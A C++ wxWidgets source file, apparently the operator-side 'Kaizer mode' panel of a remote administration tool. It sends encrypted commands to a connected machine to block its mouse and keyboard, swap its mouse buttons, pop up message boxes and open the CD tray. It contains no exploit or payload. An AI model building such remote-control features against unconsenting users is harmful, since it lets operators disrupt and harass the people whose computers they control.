#include "panel_fun.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(panelFun, wxFrame)
	EVT_BUTTON(EnumFunIDS::ID_BTN_Msg, panelFun::OnMsg)
	EVT_TOGGLEBUTTON(wxID_ANY, panelFun::OnToggle)
wxEND_EVENT_TABLE()

panelFun::panelFun(wxWindow* pParent, SOCKET _socket, std::string _strID, ByteArray c_key)
	:wxFrame(pParent, EnumFunIDS::ID_Main_Window, "Kaizer mode") {
	this->sckSocket = _socket;
	this->enc_key = c_key;
	this->SetTitle("[" + _strID + "] Kaizer mode");

	
	//////////  Mouse y teclado /////////////

	wxPanel* pnlInput = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	wxStaticBoxSizer* boxInput = new wxStaticBoxSizer(wxVERTICAL, pnlInput, "Mouse y Teclado");

	this->btn_Swap = new wxToggleButton(pnlInput, EnumFunIDS::ID_BTN_Swap, "SWAP Mouse");
	this->btn_BlockIn = new wxToggleButton(pnlInput, EnumFunIDS::ID_BTN_Block, "Bloquear Entrada (Mouse/Teclado) - ADMIN");

	boxInput->Add(this->btn_Swap, 0, wxALL | wxEXPAND);
	boxInput->Add(this->btn_BlockIn, 0, wxALL | wxEXPAND);

	pnlInput->SetSizer(boxInput);

	////////////////////////////////////////

	//////////  Mostrar mensaje /////////////

	wxPanel* pnlMensaje = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	wxStaticBoxSizer* boxMensaje = new wxStaticBoxSizer(wxVERTICAL, pnlMensaje, "Mostrar mensaje");

	wxArrayString arr;
	arr.Add("MB_ABORTRETRYIGNORE");
	arr.Add("MB_CANCELTRYCONTINUE");
	arr.Add("MB_HELP");
	arr.Add("MB_OK");
	arr.Add("MB_OKCANCEL");
	arr.Add("MB_RETRYCANCEL");
	arr.Add("MB_YESNO");
	arr.Add("MB_YESNOCANCEL");

	wxArrayString arr2;
	arr2.Add("MB_ICONERROR");
	arr2.Add("MB_ICONQUESTION");
	arr2.Add("MB_ICONWARNING");
	arr2.Add("MB_ICONINFORMATION");


	this->txtMensaje  = new wxTextCtrl(pnlMensaje, wxID_ANY, "Mensaje");
	this->txtTitulo   = new wxTextCtrl(pnlMensaje, wxID_ANY, "Titulo");
	this->cmbBotones  = new wxComboBox(pnlMensaje, wxID_ANY, "", wxDefaultPosition, wxDefaultSize, arr, wxCB_READONLY);
	this->cmbTipoMsg  = new wxComboBox(pnlMensaje, wxID_ANY, "", wxDefaultPosition, wxDefaultSize, arr2, wxCB_READONLY);
	
	boxMensaje->Add(this->txtMensaje, 1, wxALL | wxEXPAND);
	boxMensaje->Add(this->txtTitulo, 1, wxALL | wxEXPAND);
	boxMensaje->Add(this->cmbBotones, 1, wxALL | wxEXPAND);
	boxMensaje->Add(this->cmbTipoMsg, 1, wxALL | wxEXPAND);
	boxMensaje->Add(new wxButton(pnlMensaje, EnumFunIDS::ID_BTN_Msg, "Mostrar"), 1, wxALL | wxEXPAND);

	pnlMensaje->SetSizer(boxMensaje);
	///////////////////////////////////////////

	////// Miscelaneos ////////////////////

	wxPanel* pnlMisc = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	wxStaticBoxSizer* boxMisc = new wxStaticBoxSizer(wxVERTICAL, pnlMisc, "Miscelaneos");

	this->btn_CD = new wxToggleButton(pnlMisc, EnumFunIDS::ID_BTN_CD, "Abrir lectora CD");

	boxMisc->Add(this->btn_CD, 1);

	pnlMisc->SetSizer(boxMisc);

	///////////////////////////////////////////
	
	wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);

	main_sizer->Add(pnlInput, 0, wxALL | wxEXPAND);
	main_sizer->Add(pnlMensaje, 1, wxALL | wxEXPAND);
	main_sizer->Add(pnlMisc, 0, wxALL | wxEXPAND);

	this->SetSizerAndFit(main_sizer);

	this->SetSizeHints(this->GetSize(), this->GetSize());

	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void panelFun::OnMsg(wxCommandEvent& event) {
	wxString strMsg = this->txtMensaje->GetValue();
	strMsg += "<ravdo>";
	strMsg += this->txtTitulo->GetValue();
	strMsg += "<ravdo>";

	UINT type1 = this->mapa_uint[this->cmbBotones->GetValue().ToStdString()];
	UINT type2 = this->mapa_uint[this->cmbTipoMsg->GetValue().ToStdString()];

	UINT res = (type1 | type2);
	
	strMsg += std::to_string(res);

	p_Servidor->cChunkSend(this->sckSocket, strMsg.c_str(), strMsg.size(), 0, false, EnumComandos::Fun_Msg, this->enc_key);
}

void panelFun::OnToggle(wxCommandEvent& event) {
	int id = event.GetId();
	int iComando = 0;
	int iBoolean = 0;
	if (id == EnumFunIDS::ID_BTN_Block) {
		iComando = EnumComandos::Fun_Block_Input;

		if (this->btn_BlockIn->GetValue()) {
			this->btn_BlockIn->SetLabelText("Desbloquear Entrada (Mouse/Teclado) - ADMIN");
			iBoolean = 1;
		}else {
			this->btn_BlockIn->SetLabelText("Bloquear Entrada (Mouse/Teclado) - ADMIN");
			iBoolean = 0;
		}
	}else if (id == EnumFunIDS::ID_BTN_Swap) {
		iComando = EnumComandos::Fun_Swap_Mouse;
		iBoolean = this->btn_Swap->GetValue() ? 1 : 0;
	}else if (id == EnumFunIDS::ID_BTN_CD) {
		iComando = EnumComandos::Fun_CD;
		
		if (this->btn_CD->GetValue()) {
			iBoolean = 1;
			this->btn_CD->SetLabel("Cerrar lectora CD");
		}else {
			iBoolean = 0;
			this->btn_CD->SetLabel("Abrir lectora CD");
		}
	}

	std::string strPaquete = std::to_string(iBoolean);

	p_Servidor->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, false, iComando, this->enc_key);
}